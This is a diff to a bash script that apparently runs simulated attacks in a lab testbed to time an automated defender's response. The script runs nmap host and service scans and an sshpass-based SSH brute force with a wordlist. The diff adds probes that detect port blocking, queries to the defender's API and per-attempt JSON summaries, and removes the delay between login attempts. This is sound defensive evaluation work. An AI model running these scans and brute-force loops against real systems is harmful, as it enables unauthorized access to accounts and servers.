@@ -13,6 +13,19 @@ CORRECT_PASSWORD="adminadmin"
 SSH_USER="admin"
 LOG_FILE="/tmp/attack_log.txt"
 
+# Enhanced monitoring variables
+SSH_ATTEMPTS=0
+TOTAL_ATTEMPTS_BEFORE_BLOCKED=0
+SSH_PORT_BLOCKED_TIME=""
+SSH_PORT_ALREADY_BLOCKED="false"
+TIME_TO_BLOCKED_SECONDS=""
+TIME_TO_PLAN_GENERATION_SECONDS=""
+PLAN_GENERATION_ALERT_TYPE=""
+SCAN_NETWORK_SUCCESS="false"
+SCAN_PORT_SUCCESS="false"
+CURRENT_PASSWORD_ATTEMPT="none"
+LAST_PASSWORD_TRIED="none"
+
 # Create a wordlist with 250 passwords including the correct one
 create_wordlist() {
     echo "Creating wordlist with 250 passwords..."
@@ -327,9 +340,191 @@ EOF
     fi
 }
 
-# Log function
+# Fast ping function for SSH port monitoring
+fast_ping_ssh() {
+    local timeout_duration=${1:-0.1}
+
+    # Try multiple methods to detect if port is blocked
+    # Method 1: TCP connect test
+    if timeout "$timeout_duration" bash -c "</dev/tcp/$SERVER_IP/22" 2>/dev/null; then
+        return 0  # Port is open
+    fi
+
+    # Method 2: nmap port test (fallback)
+    if timeout 2 nmap -p 22 "$SERVER_IP" 2>/dev/null | grep -q "22/tcp.*open"; then
+        return 0  # Port is open according to nmap
+    fi
+
+    return 1  # Port is closed/blocked
+}
+
+# Query defender API for plan generation information
+get_defender_plan_info() {
+    log_message "Querying defender API for plan generation information..."
+
+    # Get defender port from environment or use default
+    local defender_port="${DEFENDER_PORT:-8000}"
+    local defender_host="172.31.0.1"  # Assuming defender runs on the host network
+
+    # Try to get plan generation info from defender API
+    local api_response=""
+    local attempts=0
+    local max_attempts=3
+
+    while [[ $attempts -lt $max_attempts && -z "$api_response" ]]; do
+        api_response=$(curl -s --max-time 5 \
+            -H "Content-Type: application/json" \
+            "http://$defender_host:$defender_port/api/plans" 2>/dev/null || echo "")
+
+        if [[ -z "$api_response" ]]; then
+            log_message "Attempt $((attempts + 1)) failed to reach defender API, retrying..."
+            sleep 1
+        fi
+        attempts=$((attempts + 1))
+    done
+
+    if [[ -n "$api_response" ]]; then
+        log_message "Defender API response received"
+        # Parse the response to extract plan generation time and alert type
+        # Try to extract timestamp of first plan
+        local plan_time=$(echo "$api_response" | grep -o '"created_at":[^,]*' | head -1 | cut -d: -f2 | tr -d '" ' | head -c 20)
+        local alert_type=$(echo "$api_response" | grep -o '"trigger_event":[^,]*' | head -1 | cut -d: -f2 | tr -d '" ' | head -c 50)
+
+        if [[ -n "$plan_time" ]]; then
+            # Convert to seconds since attack start
+            local plan_timestamp=$(date -d "$plan_time" +%s 2>/dev/null)
+            local start_timestamp=$(date -d "$START_TIME" +%s)
+
+            if [[ -n "$plan_timestamp" && -n "$start_timestamp" ]]; then
+                TIME_TO_PLAN_GENERATION_SECONDS=$((plan_timestamp - start_timestamp))
+                PLAN_GENERATION_ALERT_TYPE="${alert_type:-unknown}"
+                log_message "Plan generation detected: ${TIME_TO_PLAN_GENERATION_SECONDS}s after start, trigger: ${PLAN_GENERATION_ALERT_TYPE}"
+            else
+                log_message "Could not parse plan timestamp from: $plan_time"
+            fi
+        else
+            log_message "No plan creation timestamp found in defender response"
+        fi
+    else
+        log_message "No response from defender API after $max_attempts attempts"
+        # Try alternative API endpoints or methods
+        api_response=$(curl -s --max-time 3 "http://$defender_host:$defender_port/api/alerts" 2>/dev/null || echo "")
+        if [[ -n "$api_response" ]]; then
+            log_message "Found alerts endpoint, checking for relevant alerts..."
+            # Look for alerts related to our attack
+            local relevant_alert=$(echo "$api_response" | grep -A5 -B5 "172.30.0.10\|SSH\|brute" 2>/dev/null || echo "")
+            if [[ -n "$relevant_alert" ]]; then
+                PLAN_GENERATION_ALERT_TYPE="ssh_brute_force_detected"
+                log_message "SSH brute force alert detected via alerts API"
+            fi
+        fi
+    fi
+
+    # Fallback: try to check if defender has created any files indicating plan generation
+    if [[ -z "$TIME_TO_PLAN_GENERATION_SECONDS" ]]; then
+        # Check for defender log files or other indicators
+        local defender_indicators=$(find /tmp -name "*defender*" -o -name "*slips*" 2>/dev/null | head -5)
+        if [[ -n "$defender_indicators" ]]; then
+            PLAN_GENERATION_ALERT_TYPE="file_based_detection"
+            log_message "Defender activity detected via file system"
+        fi
+    fi
+}
+
+# Log function with real-time flushing
 log_message() {
     echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
+    # Force flush to disk immediately
+    sync "$LOG_FILE" 2>/dev/null || true
+    # Also flush stdio buffers
+    stdbuf -oL -eL echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
+}
+
+# Function to create summary with current state
+create_summary() {
+    local completion_status="${1:-interrupted}"
+    local success_value="${2:-interrupted}"
+    local guess_success="false"
+
+    # Determine if password was found based on success variable
+    if [[ "$success" == "true" ]]; then
+        guess_success="true"
+    fi
+
+    cat > /tmp/attack_summary.json << EOF
+{
+    "attack_id": "$ATTACK_ID",
+    "attacker_ip": "$COMPROMISED_IP",
+    "target_ip": "$SERVER_IP",
+    "start_time": "$START_TIME",
+    "end_time": "$(date -Iseconds)",
+    "scan_network_successfully": $SCAN_NETWORK_SUCCESS,
+    "scan_port_successfully": $SCAN_PORT_SUCCESS,
+    "guess_password_successfully": $guess_success,
+    "time_to_blocked_seconds": ${TIME_TO_BLOCKED_SECONDS:-null},
+    "time_to_plan_generation_seconds": ${TIME_TO_PLAN_GENERATION_SECONDS:-null},
+    "first_plan_alert": "${PLAN_GENERATION_ALERT_TYPE:-$completion_status}",
+    "opencode_running_compromised": null,
+    "opencode_running_server": null,
+    "total_attempts_before_blocked": $TOTAL_ATTEMPTS_BEFORE_BLOCKED,
+    "current_attempt": $SSH_ATTEMPTS,
+    "current_password": "$CURRENT_PASSWORD_ATTEMPT",
+    "last_password_tried": "$LAST_PASSWORD_TRIED",
+    "phases_completed": "$completion_status",
+    "success": $success_value,
+    "log_file": "$LOG_FILE",
+    "last_update": "$(date -Iseconds)"
+}
+EOF
+
+    # Force flush summary to disk immediately
+    sync /tmp/attack_summary.json 2>/dev/null || true
+}
+
+# Real-time summary update function - called continuously during attack
+update_real_time_summary() {
+    local completion_status="${1:-ongoing}"
+    local success_value="${2:-false}"
+    local guess_success="false"
+    local current_password="${3:-none}"
+
+    # Update tracking variables
+    CURRENT_PASSWORD_ATTEMPT="$current_password"
+    LAST_PASSWORD_TRIED="$current_password"
+
+    # Determine if password was found based on success variable
+    if [[ "$success_value" == "true" ]]; then
+        guess_success="true"
+    fi
+
+    cat > /tmp/attack_summary.json << EOF
+{
+    "attack_id": "$ATTACK_ID",
+    "attacker_ip": "$COMPROMISED_IP",
+    "target_ip": "$SERVER_IP",
+    "start_time": "$START_TIME",
+    "end_time": "$(date -Iseconds)",
+    "scan_network_successfully": $SCAN_NETWORK_SUCCESS,
+    "scan_port_successfully": $SCAN_PORT_SUCCESS,
+    "guess_password_successfully": $guess_success,
+    "time_to_blocked_seconds": ${TIME_TO_BLOCKED_SECONDS:-null},
+    "time_to_plan_generation_seconds": ${TIME_TO_PLAN_GENERATION_SECONDS:-null},
+    "first_plan_alert": "${PLAN_GENERATION_ALERT_TYPE:-none}",
+    "opencode_running_compromised": null,
+    "opencode_running_server": null,
+    "total_attempts_before_blocked": $TOTAL_ATTEMPTS_BEFORE_BLOCKED,
+    "current_attempt": $SSH_ATTEMPTS,
+    "current_password": "$CURRENT_PASSWORD_ATTEMPT",
+    "last_password_tried": "$LAST_PASSWORD_TRIED",
+    "phases_completed": "$completion_status",
+    "success": $success_value,
+    "log_file": "$LOG_FILE",
+    "last_update": "$(date -Iseconds)"
+}
+EOF
+
+    # Force flush to disk
+    sync /tmp/attack_summary.json 2>/dev/null || true
 }
 
 # Trap signals to exit gracefully
@@ -337,50 +532,90 @@ cleanup() {
     log_message "Attack interrupted - cleaning up..."
     # Create summary even if interrupted
     if [[ -n "$ATTACK_ID" ]]; then
-        cat > /tmp/attack_summary.json << EOF
-{
-    "attack_id": "$ATTACK_ID",
-    "attacker_ip": "$COMPROMISED_IP",
-    "target_ip": "$SERVER_IP",
-    "start_time": "$START_TIME",
-    "end_time": "$(date -Iseconds)",
-    "phases_completed": "interrupted",
-    "success": "interrupted",
-    "log_file": "$LOG_FILE"
-}
-EOF
+        create_summary "interrupted" "interrupted"
+        log_message "Attack summary created due to interruption"
     fi
     exit 130
 }
 
+# Trap EXIT to ensure summary is always created
+ensure_summary() {
+    local exit_code=$?
+    log_message "Attack process ending with exit code: $exit_code"
+
+    # Always create summary if we have an ATTACK_ID
+    if [[ -n "$ATTACK_ID" ]]; then
+        # Determine completion status based on exit code
+        if [[ $exit_code -eq 137 ]]; then
+            create_summary "terminated_by_defender" "false"
+            log_message "Attack summary created - terminated by defender (SIGKILL)"
+        elif [[ $exit_code -eq 124 ]]; then
+            create_summary "timeout" "false"
+            log_message "Attack summary created - timeout occurred"
+        elif [[ $exit_code -eq 130 ]]; then
+            # Already handled by cleanup() but ensure summary exists
+            create_summary "interrupted" "interrupted"
+            log_message "Attack summary created - user interruption"
+        elif [[ $success == "true" ]]; then
+            create_summary "completed_successfully" "true"
+            log_message "Attack summary created - completed successfully"
+        else
+            create_summary "completed_without_success" "false"
+            log_message "Attack summary created - completed without success"
+        fi
+    fi
+}
+
 # Set up signal handlers
 trap cleanup INT TERM
-
-# Don't trap EXIT to avoid double cleanup when timeout kills the process
+trap ensure_summary EXIT
 
 # Attack phases
 attack_phase_1() {
     log_message "Phase 1: Network discovery - Aggressive scanning for hosts in 172.31.0.0/24"
-    nmap -sP 172.31.0.0/24 -oN /tmp/nmap_discovery.txt
-    log_message "Phase 1 completed"
+    update_real_time_summary "phase1_network_scan" "false" "none"
+    if nmap -sP 172.31.0.0/24 -oN /tmp/nmap_discovery.txt; then
+        SCAN_NETWORK_SUCCESS="true"
+        log_message "Phase 1 completed successfully"
+        update_real_time_summary "phase1_completed" "false" "none"
+    else
+        SCAN_NETWORK_SUCCESS="false"
+        log_message "Phase 1 completed with errors"
+        update_real_time_summary "phase1_failed" "false" "none"
+    fi
 }
 
 attack_phase_2() {
     log_message "Phase 2: Aggressive port scanning - Looking for SSH on server $SERVER_IP"
-    nmap -sV -Pn "$SERVER_IP" -oN /tmp/nmap_ports.txt
-    log_message "Phase 2 completed"
+    update_real_time_summary "phase2_port_scan" "false" "none"
+    if nmap -sV -Pn "$SERVER_IP" -oN /tmp/nmap_ports.txt; then
+        SCAN_PORT_SUCCESS="true"
+        log_message "Phase 2 completed successfully"
+        update_real_time_summary "phase2_completed" "false" "none"
+    else
+        SCAN_PORT_SUCCESS="false"
+        log_message "Phase 2 completed with errors"
+        update_real_time_summary "phase2_failed" "false" "none"
+    fi
 }
 
 attack_phase_3() {
     log_message "Phase 3: Brute force attack - Starting SSH brute force on $SERVER_IP:22"
     log_message "Using wordlist with $(wc -l < "$WORDLIST_FILE") passwords"
+    update_real_time_summary "phase3_bruteforce_start" "false" "none"
 
-    # Ensure ssh client is available
+    # Ensure ssh client and curl are available
     if ! command -v ssh &> /dev/null; then
         log_message "Installing openssh-client..."
         apt-get update > /dev/null 2>&1
         apt-get install -y openssh-client > /dev/null 2>&1
         log_message "SSH client installation completed"
+    fi
+
+    if ! command -v curl &> /dev/null; then
+        log_message "Installing curl for defender API queries..."
+        apt-get install -y curl > /dev/null 2>&1
+        log_message "Curl installation completed"
     fi
 
     # Simple SSH brute force script
@@ -390,11 +625,23 @@ attack_phase_3() {
 
     log_message "Starting brute force with $total_passwords passwords"
 
+    # Check if SSH port is already blocked before starting brute force
+    log_message "Checking SSH port availability before starting brute force..."
+    if fast_ping_ssh 0.1; then
+        SSH_PORT_ALREADY_BLOCKED="false"
+        log_message "SSH port is reachable - starting brute force attack"
+    else
+        SSH_PORT_ALREADY_BLOCKED="true"
+        log_message "WARNING: SSH port is already blocked before brute force attack!"
+    fi
+
     while IFS= read -r password; do
         # Skip empty lines
         [[ -z "$password" ]] && continue
 
         log_message "Attempt $attempt/$total_passwords: Trying password '$password'"
+        SSH_ATTEMPTS=$((SSH_ATTEMPTS + 1))
+        TOTAL_ATTEMPTS_BEFORE_BLOCKED=$SSH_ATTEMPTS  # Update continuously
 
         # Use sshpass for non-interactive SSH login
         if ! command -v sshpass &> /dev/null; then
@@ -493,12 +740,36 @@ EOF
                 log_message "Attempt $attempt failed: ${ssh_result:0:100}..."
             fi
             rm -f "$output_file" 2>/dev/null
+
+            # FAST PING MONITORING: Check if SSH port becomes blocked after failed attempt
+            if [[ -z "$SSH_PORT_BLOCKED_TIME" ]]; then
+                log_message "Monitoring SSH port availability after failed attempt..."
+                if ! fast_ping_ssh 0.1; then
+                    SSH_PORT_BLOCKED_TIME="$(date -Iseconds)"
+                    TOTAL_ATTEMPTS_BEFORE_BLOCKED=$SSH_ATTEMPTS
+
+                    # Calculate time to blocked
+                    start_timestamp=$(date -d "$START_TIME" +%s)
+                    blocked_timestamp=$(date -d "$SSH_PORT_BLOCKED_TIME" +%s)
+                    TIME_TO_BLOCKED_SECONDS=$((blocked_timestamp - start_timestamp))
+
+                    log_message "ALERT: SSH port became blocked after $SSH_ATTEMPTS attempts at $SSH_PORT_BLOCKED_TIME"
+                    log_message "Time to blocked: ${TIME_TO_BLOCKED_SECONDS} seconds from start"
+                else
+                    log_message "SSH port still reachable after failed attempt"
+                fi
+            fi
         fi
 
         attempt=$((attempt + 1))
 
-        # Add a delay between attempts to avoid triggering too many alarms and reduce resource usage
-        sleep 0.5
+        # NOTE: Defender timing data will be extracted from auto_responder_timeline.jsonl after experiment completes
+
+        # REAL-TIME SUMMARY UPDATE: Update summary after each SSH attempt
+        update_real_time_summary "phase3_ssh_bruteforce" "$success" "$password"
+
+        # NO MORE SLEEP - using fast ping monitoring instead
+        # sleep 0.5  # REMOVED
 
     done < "$WORDLIST_FILE"
 
@@ -516,6 +787,9 @@ EOF
 main() {
     log_message "Starting attack sequence from $COMPROMISED_IP targeting $SERVER_IP"
     log_message "Attack started at $(date)"
+
+    # Create initial summary
+    update_real_time_summary "attack_started" "false" "none"
 
     # Create wordlist
     create_wordlist
@@ -538,21 +812,14 @@ main() {
     log_message "Attack completed at $(date)"
     log_message "Final result: $SUCCESS"
 
-    # Create summary
-    cat > /tmp/attack_summary.json << EOF
-{
-    "attack_id": "$ATTACK_ID",
-    "attacker_ip": "$COMPROMISED_IP",
-    "target_ip": "$SERVER_IP",
-    "start_time": "$START_TIME",
-    "end_time": "$(date -Iseconds)",
-    "phases_completed": 3,
-    "success": $SUCCESS,
-    "wordlist_size": $(wc -l < "$WORDLIST_FILE"),
-    "correct_password": "$CORRECT_PASSWORD",
-    "log_file": "$LOG_FILE"
-}
-EOF
+    # NOTE: Defender timing data will be extracted from auto_responder_timeline.jsonl after experiment completes
+
+    # Create summary using the unified function
+    if [[ "$success" == "true" ]]; then
+        create_summary "completed_successfully" "true"
+    else
+        create_summary "completed_without_success" "false"
+    fi
 
     echo "Attack summary saved to /tmp/attack_summary.json"
 }
